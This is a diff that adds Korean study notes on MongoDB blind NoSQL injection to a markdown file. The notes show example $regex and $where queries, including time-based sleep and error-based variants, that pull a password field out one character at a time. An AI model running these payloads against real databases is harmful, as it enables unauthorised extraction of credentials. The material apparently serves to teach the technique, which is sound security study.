@@ -198,6 +198,53 @@
 <br/><br/>
 
 ### MongoDB Blind Injection
+* 추출하기 위한 데이터를 직접적으로 확인할 수 없는 상황에서 사용할 수 있음 <br/> &nbsp;&nbsp; → **```$regex```, ```$where``` 연산자**를 사용해 Blind Injection을 수행할 수 있음
+    - ```$regex``` 연산자를 사용하는 방법
+        + ```$regex``` 연산자는 **정규식을 사용해 식과 일치하는 데이터를 조회**함
+            | 정규식 표현 | 설명 |
+            |:---:|------|
+            | ```^``` | 입력의 시작 부분을 나타냄 <br/> &nbsp;&nbsp; → ```^a```, ```^ab```와 같이 각 위치에 맞는 알파벳을 찾으면 다음 위치에서 다시 하나의 일파벳을 조회하여 비밀번호를 알아낼 <br/> &nbsp;&nbsp;&nbsp;&nbsp; 수 있음 |
+            | ```.{숫자}``` | ```.```은 모든 문자 하나와 일치하고, ```{...}```은 반복을 나타냄 <br/> &nbsp;&nbsp; → 중괄호 안의 숫자를 변경시켜가며 비밀번호의 길이를 획득할 수 있음 |
+            - 예시: user 컬렉션의 ```upw```에서 각 문자로 시작하는 데이터(```{$regex: "^알파벳"}```)를 조회함
+                ```mongodb
+                db.user.find({upw: {$regex: "^a"}}) → upw의 첫 번째 글자가 a인 데이터를 조회함 (F)
+                db.user.find({upw: {$regex: "^b"}}) → upw의 첫 번째 글자가 b인 데이터를 조회함 (F)
+                ...
+                db.user.find({upw: {$regex: "^g"}}) → upw의 첫 번째 글자가 g인 데이터를 조회함 (T)
+                ```
+    - ```$where``` 연산자를 사용하는 방법
+        + ```$where``` 연산자는 **인자로 전달한 Javascript 표현식을 만족하는 데이터를 조회**함
+            - ```substring``` 함수를 이용
+                | 함수 | 설명 |
+                |:---:|------|
+                | ```substring(start, end)``` | ```start```에서 ```end```까지 문자열을 잘라 해당 문자열을 반환함 (```end-1```까지 문자열을 자름) <br/> &nbsp;&nbsp; → ```start```의 값을 변경하여 한 글자씩 데이터를 알아낼 수 있음 |
+                + 예시: user 컬렉션의 ```upw```의 첫 번째 글자(```upw.substring(0, 1)```)를 비교해 데이터를 추출할 수 있음
+                    ```mongodb
+                    db.user.find({$where: "this.upw.substring(0, 1) == 'a'"}) → upw의 첫 번째 글자가 a인 데이터를 조회함 (F)
+                    db.user.find({$where: "this.upw.substring(0, 1) == 'b'"}) → upw의 첫 번째 글자가 b인 데이터를 조회함 (F)
+                    ...
+                    db.user.find({$where: "this.upw.substring(0, 1) == 'g'"}) → upw의 첫 번째 글자가 g인 데이터를 조회함 (T)
+                    ```
+            - Time based: ```sleep``` 함수 이용
+                + Javascript 표현식과 ```sleep(sec)``` 함수를 ```&&```(논리 AND)로 연결하면 표현식을 만족할 경우 시간 지연이 발생함
+                + 예시: user 컬렉션에서 ```upw```의 첫 번째 글자(```upw.substring(0, 1)```)를 비교하여 참일 경우에 시간 지연이 발생함
+                    ```mongodb
+                    db.user.find({$where: "this.uid=guest&&this.upw.substring(0, 1)=='a'&&sleep(5000)"})
+                    db.user.find({$where: "this.uid=guest&&this.upw.substring(0, 1)=='b'&&sleep(5000)"})
+                    ...
+                    db.user.find({$where: "this.uid=guest&&this.upw.substring(0, 1)=='g'&&sleep(5000)"}) → 결과가 참이므로 시간 지연 발생
+                    ```
+            - Error based
+                + Javascript 표현식과 올바르지 않은 문법으로 구성된 데이터를 ```&&```(논리 AND)로 연결하면 표현식을 만족할 경우 에러가 발생됨
+                + 예시: user 컬렉션에서 ```upw```의 첫 번째 글자(```upw.substring(0, 1)```)를 비교하여 참일 경우에 에러가 발생함
+                    ```mongodb
+                    db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='g'&&asdf&&'1'&&this.upw=='${upw}'"});
+                    // → error: { "$err": "ReferenceError: asdf is not defined near '&&this.upw== '$upw'' "}, code: 16722
+                    //    (this.upw.substring(0, 1) == 'g'가 참이기 때문에 asdf 코드가 실행되어 해당 부분에서 에러 발생)
+
+                    db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='a'&&asdf&&'1'&&this.upw=='${upw}'"});
+                    //     (this.upw.substring(0,1)=='a' 값이 거짓이기 때문에 뒤에 코드가 작동하지 않음)
+                    ```
 
 <br/><br/><br/>
 
